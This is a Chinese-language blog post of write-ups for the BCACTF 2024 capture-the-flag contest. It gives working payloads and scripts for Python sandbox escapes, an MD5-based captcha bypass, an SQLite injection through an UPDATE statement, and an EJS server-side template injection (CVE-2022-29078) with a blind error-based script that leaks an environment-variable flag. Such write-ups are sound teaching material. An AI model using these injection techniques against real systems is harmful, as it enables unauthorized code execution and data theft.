---
title: "bcactf2024 Writeups"
date: 2024-06-11T10:38:43+08:00
draft: false
ShowToc: true
---
## 前言

這次端午節跟牛肉湯夥伴們用了一些時間來打這場 CTF，解了 web 跟 misc ，剩下的就交給隊友。
因為時間沒有很多，所以策略就是先從分數高的開始解！

這篇記錄我覺得很酷的一些題目。

![image](https://hackmd.io/_uploads/rklW67BS0.png)
最後打了 25/1201

## misc

### Jailbreak1

```python!
def sanitize(letter):
    print("Checking for contraband...")
    return any([i in letter.lower() for i in BANNED_CHARS])

BANNED_CHARS = "gdvxftundmnt'~`@#$%^&*-/.{}"
flag = open('flag.txt').read().strip()

print("Welcome to the prison's mail center")
msg = input("Please enter your message: ")

if sanitize(msg): 
    print("Contraband letters found!\nMessage Deleted!")
    exit()

exec(msg)
```

單純 ban 掉一些字元，也不能用 `.`，也不會將 exec 結果回傳。



先寫個腳本看我們還剩什麼能用:
```python!
import builtins
exclude_chars = set("gdvxftundmnt")

builtins_not_containing_chars = []
for name in dir(builtins):
    if not any(char in name for char in exclude_chars):
        builtins_not_containing_chars.append(name)

print("\nBuiltins not containing specified chars:")
print(builtins_not_containing_chars)
"""
['EOFError', 'Ellipsis', 'False', 'IOError', 'KeyError', 'OSError', 'TabError', 'TypeError', '__IPYTHON__', '__spec__', 'abs', 'all', 'ascii', 'bool', 'callable', 'chr', 'hash', 'help', 'locals', 'pow', 'repr', 'slice', 'zip']
"""
```

發現有 help() 但發現他不會進到 more qq

{{< info >}}
看 Discord 發現有人直接用 `help(repr(locals()))` 從 stderr 拿 flag XD
{{< /info >}}

我們可以透過 locals 去拿到 flag 變數，但她把 x ban 掉了，所以不能用像這種方式繞關鍵字 `"\x66\0x6c\0x61\0x67"`，但他有給用 `+` 跟 `chr`，所以可以這樣:

`locals()[chr(102)+chr(108)+chr(97)+chr(103)]`

接下來就是要怎麼把 flag 傳出來，幸運地，這題會給我們 stderr 的內容，所以可以隨便拿個 dict （這邊選 `locals()`）之後去取這個不存在的 key 就可以leak flag 了:

`locals()[locals()[chr(102)+chr(108)+chr(97)+chr(103)]]`


```
Welcome to the prison's mail center
Please enter your message: locals()[locals()[chr(102)+chr(108)+chr(97)+chr(103)]]
Checking for contraband...
Traceback (most recent call last):
  File "/app/deploy.py", line 15, in <module>
    exec(msg)
  File "<string>", line 1, in <module>
KeyError: 'bcactf{PyTH0n_pR0_03ed78292b89c}'
```

然後可以用 help 所以也可以這樣XD

```python!
root@vincent55:~# nc challs.bcactf.com 32087
Welcome to the prison's mail center
Please enter your message: help(locals()[chr(102)+chr(108)+chr(97)+chr(103)])
Checking for contraband...
No Python documentation found for 'bcactf{PyTH0n_pR0_03ed78292b89c}'
```

### Jailbreak2

```python!
def sanitize(letter):
    print("Checking for contraband...")
    return any([i in letter.lower() for i in BANNED_CHARS])

def end():
    print("Contraband letters found!\nMessages Deleted!")
    exit()

BANNED_CHARS = "gdvxfiyundmnet/\\'~`@#$%^&.{}0123456789"
flag = open('flag.txt').read().strip()

print("Welcome to the prison's mail center")

msg = input("\nPlease enter your message: ")

while msg != "":
    if sanitize(msg): 
        end()

    try:
        x = eval(msg)
        if len(x) != len(flag): end()
        print(x)
    except Exception as e:
        print(f'Error occured: {str(e)}; Message could not be sent.')

    msg = input("\nPlease enter your message: ")
```

這題多 ban 了數字，但會給我們 eval 的內容且結果長度要跟 flag 一樣才可以拿到，在之後的 revenge 才會用到這個性質，這題用了非預期解

btw stderr 還能夠使用！ 但想用我們 Jailbreak1 的 payload 之前要想辦法繞過數字，。

這時就想到了 splitline 出來 HITCONCTF2022 的 [VOID](https://blog.splitline.tw/hitcon-ctf-2022/#v-o-i-d-misc) 中用到的一個 trick:

```
(not [])+ (not []) -> 2
```

但這題有 ban 掉 `n`，所以不能用 not，不過上面 `not []` 的本質是 True，所以我們找一個 True 替代掉它也行，這邊用了 `"a"=="a"`。

透過這樣就能組合出任意數字! 之後再拿去 chr 就可以取得任意字串!

來開始寫 payload:

```python!
f = ('("a"=="a")+'*102).rstrip('+')
l = ('("a"=="a")+'*108).rstrip('+')
a = ('("a"=="a")+'*97).rstrip('+')
g = ('("a"=="a")+'*103).rstrip('+')
payload = f'locals()[locals()[chr({f})+chr({l})+chr({a})+chr({g})]]'
print(payload)
```

但這樣太長了，會撞到 UNIX shell 4096 的上限，所以把 l a 不要展開:

```python!
f = ('("a"=="a")+'*102).rstrip('+')
g = ('("a"=="a")+'*103).rstrip('+')
payload = f'locals()[locals()[chr({f})+"la"+chr({g})]]'
print(payload)
```

這樣就有了 !

```
Welcome to the prison's mail center

Please enter your message: locals()[locals()[chr(("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a"))+"la"+chr(("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a")+("a"=="a"))]]
Checking for contraband...
Error occured: 'bcactf{PyTH0n_M4st3R_Pr0veD}'; Message could not be sent.
```



### Jailbreak revenge

```python!
def sanitize(letter):
    print("Checking for contraband...")
    print(any([ord(l) > 120 for l in letter]))
    print(any([(i in letter.lower()) for i in BANNED_CHARS]))
    for i in letter.lower():
        if i in BANNED_CHARS:
            print(i)
    return any([(i in letter.lower()) for i in BANNED_CHARS]) or any([ord(l) > 120 for l in letter])


def end():
    print("Contraband letters found!\nMessages Deleted!")
    exit()


BANNED_CHARS = "gdvxfiyundmpnetkb/\\'\"~`!@#$%^&*.{},:;=0123456789#-_|? \t\n\r\x0b\x0c"
flag = open('flag.txt').read().strip()

print("Welcome to the prison's mail center")

msg = input("\nPlease enter your message: ")

while msg != "":
    if sanitize(msg):
        end()

    try:
        x = eval(msg)
        print(x)
        if len(x) != len(flag):
            end()
        print(x)
    except Exception as e:
        print(f'Error.')

    msg = input("\nPlease enter your message: ")
```

diff 了一下，多 ban 了一些字元，英文字的部分不影響我們之前的 payload，但 `=` 跟 `"` 被 ban 掉了。

另外，stderr 的 trick 不能用了，但既然他會給我們 eval 的結果，那我們只要 `locals()[flag]` 就可以了XD

接下來，我們要想想取得字串的替代方案。

再跑一次 script 看一下我們能用哪些東西。

```python!
In [24]: import builtins
exclude_chars = set("gdvxfiyundmpnetkb")
builtins_not_containing_chars = []
for name in dir(builtins):
     if not any(char in name for char in exclude_chars):
        builtins_not_containing_chars.append(name)
print("\nBuiltins not containing specified chars:")
print(builtins_not_containing_chars)
"""
['EOFError', 'IOError', 'OSError', '__IPYTHON__', 'all', 'chr', 'hash', 'locals']
"""
```

all 還能用，那我們就可以透過 `all([])` 來拿 True，可喜可賀。

payload:

```python!
f = ('all([])+'*102).rstrip('+')
l = ('all([])+'*108).rstrip('+')
a = ('all([])+'*97).rstrip('+')
g = ('all([])+'*103).rstrip('+')
payload = f'locals()[chr({f})+chr({l})+chr({a})+chr({g})]'
print(payload)
```

## Web

### Fogblaze

一個黑箱題，有個自製的 stateless 的 captcha 系統，要存取 `/flag` 之前要先做完 75 個，在時間內手動確實做不太完XD

觀察一下他怎麼 captcha 的:

請求中會帶上當前的 captchaToken 跟對應的答案

```json!
{"captchaToken":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjYXB0Y2hhSWQiOiJkMjYyNzM4Ny1lZWMyLTQ0ZmMtODkyYS05MmIxYzQwY2JkZGYiLCJyb3V0ZUlkIjoiLyIsImNoYWxsZW5nZUlkIjoiZjkxYTIzODk0YjE0NjEyZWQ5ODBlY2RmZTAzZTU1ZTgiLCJzb2x2ZWQiOjAsInRvdGFsIjoyLCJkb25lIjpmYWxzZSwiaWF0IjoxNzE4MDcyOTE1LCJleHAiOjE3MTgwNzI5NzV9.GkrUlDxLdRkH78Yd_vO7VBx_g6LKza-18pvE8Ktuuko","word":"JDCN"}
```

然後會回你答對題數跟下一題的圖片還有 captchaToken。


```json!
{
    "captchaToken": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjYXB0Y2hhSWQiOiJkMjYyNzM4Ny1lZWMyLTQ0ZmMtODkyYS05MmIxYzQwY2JkZGYiLCJyb3V0ZUlkIjoiLyIsImNoYWxsZW5nZUlkIjoiZjkxYTIzODk0YjE0NjEyZWQ5ODBlY2RmZTAzZTU1ZTgiLCJzb2x2ZWQiOjAsInRvdGFsIjoyLCJkb25lIjpmYWxzZSwiaWF0IjoxNzE4MDcyOTE1LCJleHAiOjE3MTgwNzI5NzV9.GkrUlDxLdRkH78Yd_vO7VBx_g6LKza-18pvE8Ktuuko",
    "image": "data:image/png;base64,iVBORw...",
    "solved": 0,
    "total": 2,
    "done": false
}
```

看一下 captchaToken 發現裡面有以下資訊:

```json!
{
  "captchaId": "d2627387-eec2-44fc-892a-92b1c40cbddf",
  "routeId": "/",
  "challengeId": "f91a23894b14612ed980ecdfe03e55e8",
  "solved": 0,
  "total": 2,
  "done": false,
  "iat": 1718072915,
  "exp": 1718072975
}
```

其中 challengeId 看起來很像 md5，拿去 crack 看看，發現他就是該題的答案(!)

`f91a23894b14612ed980ecdfe03e55e8` -> JDCN

然後觀察一下所有題目圖片都是 `[a-zA-z]{4}` 所以不難建表，接下來寫個腳本自動跑 captcha:

```python!
import requests
import hashlib
import itertools
import string
import jwt

combinations = itertools.product(string.ascii_letters, repeat=4)
hash_dict = {}
for comb in combinations:
    original = "".join(comb)
    hash_obj = hashlib.md5(original.encode())
    hash_value = hash_obj.hexdigest()
    hash_dict[hash_value] = original


def token2cap(token):
    return jwt.decode(token, options={"verify_signature": False})


s = requests.Session()


url = "http://challs.bcactf.com:30477/captcha"

r = s.post(url, json={"routeId": "/flag"})
token = r.json()["captchaToken"]


for _ in range(75):
    r = s.post(
        url,
        json={
            "captchaToken": token,
            "word": hash_dict[token2cap(token)["challengeId"]],
        },
    )
    token = r.json()["captchaToken"]
    print(r.json()["solved"])


print(r.json())
print(s.cookies)

print(
    s.get("http://challs.bcactf.com:30477/flag?token=" + r.json()["captchaToken"]).text
)
```

### User #1

黑箱，可猜測 sql 如下:

`UPDATE users SET name={可控};`

並且每次執行完以上 query 之後會用以下 hardcode query 來取得 id=1 的內容。

`SELECT name FROM user WHERE id = 1;`

透過以下 payload 來取得 users columns

`", name=(SELECT sql FROM sqlite_master WHERE type='table') WHERE id = 1;-- `

再透過以下 payload 來取得隱藏 table

`", name=(SELECT name FROM sqlite_master WHERE type = "table" LIMIT 1 OFFSET 1) WHERE id = 1;-- `

到這邊可以知道兩個 tables 的結構

```sql!
CREATE TABLE roles_ebd54b04617baf5b (id INTEGER, admin INTEGER, FOREIGN KEY(id) REFERENCES users(id) ON UPDATE CASCADE)
CREATE TABLE users (id INTEGER PRIMARY KEY, name TEXT NOT NULL)
```

`roles_ebd54b04617baf5b` 的 id 會根據 users 的 id 變動，又因為每次都會將 id=1 的 users name 印出來。

到目前大概可以猜測我們的目標是將 id=1 的 roles_ebd54b04617baf5b 中的 admin 變成 1。

有幾種想法:
- 直接跨 tables 修改 roles_ebd54b04617baf5b 的 admin column
- 修改 users id=0 為 1

想法一在 sqlite 是不可行的，有查到 [UPDATE-FROM](https://sqlite.org/lang_update.html) 語法但只可以取其他 tables 的值，不可以修改。

note: 在其他 dbms 或許可以在一個 UPDATE statement 中修改多個 tables 的內容。ex. MYSQL

看來只剩下想法二了，但是若考慮以下的寫法交換兩個 id 的話會報錯 `UNIQUE constraint failed`。

`UPDATE users SET id=(case when id=1 then 0 else 1 end) WHERE id=0 OR id=1;-- `

因為它會按照順序走訪，從 0 開始他會發現同時出現了兩個 id=1 就會出問題。

在這裡卡了一陣子，之後想到如果我們先將 id=0改為 3，這樣就能讓 id=1 先運作把位置讓走，之後換 id=3 的時候就可以坐在 id=0 了

最終 payload:
```sql!
UPDATE users SET id=3 WHERE id=0;
UPDATE users SET id=(case when id=1 then 0 else 1 end) WHERE id=3 OR id=1;-- 
```

### Dock Finder

這題我是接手 ball54 的，他已經能成功執行 JavaScript了，但不知道為何不能 RCE，差在把 flag 拿回來。
主要是用這 [CVE-2022-29078](https://eslam.io/posts/ejs-server-side-template-injection-rce/)

主要的成因是在

```javascript!
app.post('/', (req, res) => {
    for (const [breed, summary] of Object.entries(breeds)) {
        if (req.body?.breed?.toLowerCase() === breed.toLowerCase()) {
            res.render('search', {
                summary,
                notFound: false,
                ...req.body
            })
            return
        }
    }

    res.render('search', { notFound: true })
}
```

payload(from ball54):

```
breed=Pekin&summary='aaaa'&settings[view options][outputFunctionName]=x;<js code>;s
```

他的 flag 放在環境變數內:

```javascript!
if (!Deno.env.has('FLAG')) {
    throw new Error('flag is not configured')
}
```

最後我的作法是透過 blind base 中 error 的做法把 flag 慢慢 leak 出來XDD

```python!
import requests

url = "http://challs.bcactf.com:30684/"

data = {
    "breed": "Pekin",
    "summary": "'aaaa'",
    "settings[view options][outputFunctionName]": "x;if(Deno.env.get('FLAG').startsWith('b')){throw new Error()};s",
}

flag = "bcactf{"


response = requests.post(url, data=data)
charset = "_abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ}"

while True:
    for c in charset:
        data["settings[view options][outputFunctionName]"] = (
            f"x;if(Deno.env.get('FLAG').startsWith('{flag+c}')){{throw new Error()}};s"
        )
        response = requests.post(url, data=data)
        if "Internal Server Error" in response.text:
            flag += c
            print(flag)
            break
    else:
        print("GG")


print(response.text)
```

大致就是:

```javascript!
if(Deno.env.get('FLAG').startsWith('<flag>')){throw new Error()}
```

![image](https://hackmd.io/_uploads/rJ0sTVSBR.png)

